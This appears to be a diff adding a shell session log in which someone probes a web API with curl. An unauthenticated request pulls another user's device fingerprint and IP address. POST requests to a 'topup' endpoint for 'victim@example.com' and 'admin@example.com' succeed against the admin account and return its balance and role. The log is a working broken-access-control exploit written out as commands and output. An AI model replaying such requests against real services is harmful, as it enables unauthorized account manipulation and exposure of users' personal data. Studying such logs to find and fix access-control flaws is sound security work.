@@ -1,0 +1,82 @@
+aleksandrvorobev@MacBook-Pro-Aleksandr-4 documents % curl -sS "http://82.202.142.35:8080/api/users/igorpevnev9@gmail.com/devices"
+{
+  "error": "User not found"
+}
+aleksandrvorobev@MacBook-Pro-Aleksandr-4 documents % POST /api/users/<email>/topup
+zsh: no such file or directory: email
+aleksandrvorobev@MacBook-Pro-Aleksandr-4 documents % POST /api/users/admin@example.com/topup
+zsh: command not found: POST
+aleksandrvorobev@MacBook-Pro-Aleksandr-4 documents % curl -sS "http://82.202.142.35:8080/api/users/igorpevnev9@gmail.com/devices"
+{
+  "error": "User not found"
+}
+aleksandrvorobev@MacBook-Pro-Aleksandr-4 documents % POST /api/users/admin@example.com/topup
+zsh: command not found: POST
+aleksandrvorobev@MacBook-Pro-Aleksandr-4 documents % curl -sS "http://82.202.142.35:8080/api/users/admin@example.com/devices"
+[
+  {
+    "audio_fingerprint": "running",
+    "browser": "chrome",
+    "browser_version": "144.0.0.0",
+    "canvas_fingerprint": "AA//8WcMReAAAABklEQVQDAGdSMDyPghR+AAAAAElFTkSuQmCC",
+    "collected_at": "2026-04-01 17:03:28",
+    "connection_downlink": "5.15",
+    "connection_rtt": "150",
+    "connection_save_data": "0",
+    "connection_type": "4g",
+    "cookie_enabled": "1",
+    "cpu_cores": "12",
+    "device_memory": "Unknown",
+    "device_pixel_ratio": "1.25",
+    "device_type": "Desktop",
+    "do_not_track": "Unknown",
+    "gpu": "ANGLE (Intel, Intel(R) UHD Graphics (0x00009BC4) Direct3D11 vs_5_0 ps_5_0, D3D11)",
+    "hardware_concurrency": "12",
+    "id": 1,
+    "ip_address": "5.129.227.90",
+    "java_enabled": "0",
+    "language": "ru",
+    "languages": "ru,en",
+    "memory": null,
+    "memory_limit": "4096 MB",
+    "memory_total": "4 MB",
+    "memory_used": "3 MB",
+    "os": "Windows",
+    "os_version": "10",
+    "platform": "Win32",
+    "plugins": "PDF Viewer, Chrome PDF Viewer, Chromium PDF Viewer, Microsoft Edge PDF Viewer, WebKit built-in PDF",
+    "screen_avail_resolution": "1536x824",
+    "screen_color_depth": "24-bit",
+    "screen_pixel_depth": "24",
+    "screen_resolution": "1536x864",
+    "timezone": "Europe/Moscow",
+    "timezone_offset": "-180",
+    "touch_support": "No",
+    "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 YaBrowser/26.3.0.0 Safari/537.36",
+    "user_id": 1,
+    "vendor": "Google Inc. (Intel)",
+    "webrtc_ips": ""
+  }
+]
+aleksandrvorobev@MacBook-Pro-Aleksandr-4 documents % POST /api/users/admin@example.com/topup
+zsh: command not found: POST
+aleksandrvorobev@MacBook-Pro-Aleksandr-4 documents % curl -sS -X POST "http://82.202.142.35:8080/api/users/victim@example.com/topup" \
+  -H "Content-Type: application/json" \
+  -d '{"amount":1000,"card_number":"4111111111111111","card_expiry":"12/28","card_name":"X","card_cvv":"123"}'
+{
+  "error": "User not found"
+}
+aleksandrvorobev@MacBook-Pro-Aleksandr-4 documents % curl -sS -X POST "http://82.202.142.35:8080/api/users/admin@example.com/topup" \
+  -H "Content-Type: application/json" \
+  -d '{"amount":1000,"card_number":"4111111111111111","card_expiry":"12/28","card_name":"X","card_cvv":"123"}'
+{
+  "balance": 501000,
+  "created_at": "2026-04-01 16:55:10",
+  "email": "admin@example.com",
+  "id": 1,
+  "name": "\u0410\u043b\u0435\u043a\u0441\u0435\u0439 \u0421\u043c\u0438\u0440\u043d\u043e\u0432",
+  "notifications": true,
+  "role": "admin",
+  "shipping_address": null
+}
+aleksandrvorobev@MacBook-Pro-Aleksandr-4 documents % 
